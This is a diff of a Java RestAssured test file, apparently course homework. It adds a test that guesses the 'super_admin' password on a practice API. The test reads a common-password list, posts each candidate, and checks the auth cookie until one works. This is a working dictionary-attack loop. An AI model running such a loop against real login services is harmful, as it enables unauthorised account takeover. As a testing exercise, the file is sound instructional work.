@@ -4,6 +4,7 @@ import io.restassured.response.Response;
 import org.junit.jupiter.api.BeforeAll;
 import org.junit.jupiter.api.Test;
 
+import java.io.BufferedReader;
 import java.io.FileReader;
 import java.io.IOException;
 import java.util.*;
@@ -53,7 +54,7 @@ public class HelloWorldTest {
 
     @Test
     public void testRestAssured2(){
-        Map <String, Object> data = new HashMap<>();
+        Map<String, Object> data = new HashMap<>();
         data.put("login","secret_login");
         data.put("password","secret_pass");
         Response response = given()
@@ -185,5 +186,68 @@ public class HelloWorldTest {
         assertTrue(realTimeOfTaskCompletion<cycleLifetime);
         System.out.printf("Примерное время завершения задачи: %d%n", realTimeOfTaskCompletion);
         System.out.printf("Результат выполнения задачи: %s%n", result);
+    }
+
+    @Test
+    public void testAuthorized() throws IOException{
+
+        boolean authorizatioStatus = false;
+        String userPassword = "";
+
+        Map <String, Object> data = new HashMap<>();
+        data.put("login","super_admin");
+
+        Set<String> mostFrequentlyUsedPasswords = new HashSet<>();
+
+        try (BufferedReader br = new BufferedReader(new FileReader("mostCommonPasswords"))) {
+            String line;
+            while ((line = br.readLine()) != null) {
+                line = line.trim();
+                if (line.isEmpty()) continue;
+
+                String[] password = line.split("\\s+");
+                for (int i = 1; i < password.length; i++) {
+                    mostFrequentlyUsedPasswords.add(password[i]);
+                }
+            }
+        }
+
+        System.out.println(mostFrequentlyUsedPasswords);
+
+        for (String password : mostFrequentlyUsedPasswords) {
+            data.put("password",password);
+            Response response = given()
+                    .body(data)
+                    .when()
+                    .post(baseUrl+basePath+"/get_secret_password_homework");
+            String responseCookie = response.getCookie("auth_cookie");
+
+            Map<String,String> cookies = new HashMap<>();
+            cookies.put("auth_cookie", responseCookie);
+            String checkAuth = given()
+                    .body(data)
+                    .cookies(cookies)
+                    .when()
+                    .post(baseUrl+basePath+"/check_auth_cookie")
+                    .body()
+                    .asString();
+
+            if("You are authorized".equals(checkAuth)){
+                authorizatioStatus = true;
+                userPassword = password;
+                break;
+            }
+        }
+
+        if(authorizatioStatus)
+        {
+            System.out.printf("Пользователь авторизован. Пароль: %s%n", userPassword);
+        }
+        else
+        {
+            System.out.println("Пользователь не авторизован. Не удалось подобрать пароль из предложенного списка");
+        }
+
+
     }
 }
